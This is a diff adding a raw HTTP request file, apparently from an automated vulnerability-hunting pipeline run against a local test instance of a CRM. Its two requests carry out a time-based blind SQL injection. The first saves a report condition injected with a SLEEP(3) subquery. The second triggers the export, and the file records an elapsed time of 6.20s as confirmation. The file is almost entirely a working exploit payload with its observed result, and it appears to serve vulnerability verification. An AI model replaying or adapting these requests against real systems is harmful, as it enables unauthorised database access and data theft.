@@ -1,0 +1,24 @@
+# Step 1/2: plant the malicious condition (Referer + session cookie required)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Referer: http://localhost:33116/index.php?module=AOR_Reports&action=EditView
+Cookie: PHPSESSID=03d940e6cf88e9a8009c7a4970132a12
+Content-Length: 424
+Content-Type: application/x-www-form-urlencoded
+
+module=AOR_Reports&action=Save&record=&name=probe_sleep3_r_28c5f3e9&report_module=AOK_KnowledgeBase&description=&aor_conditions_field%5B0%5D=id+IS+NULL+OR+%28SELECT+SLEEP%283%29%29%29%23&aor_conditions_field_type%5B0%5D=varchar&aor_conditions_operator%5B0%5D=Equal_To&aor_conditions_value_type%5B0%5D=Value&aor_conditions_value%5B0%5D=PROBE&aor_conditions_module_path%5B0%5D=AOK_KnowledgeBase&aor_conditions_deleted%5B0%5D=0
+
+# Step 2/2: trigger it -- this is the timed request (decisive: elapsed time)
+GET /index.php?module=AOR_Reports&action=export&record=d0fb8388-a14e-4a1c-97cc-559c9845e5bb HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Cookie: PHPSESSID=03d940e6cf88e9a8009c7a4970132a12
+
+# observed wall-clock elapsed: 6.20s
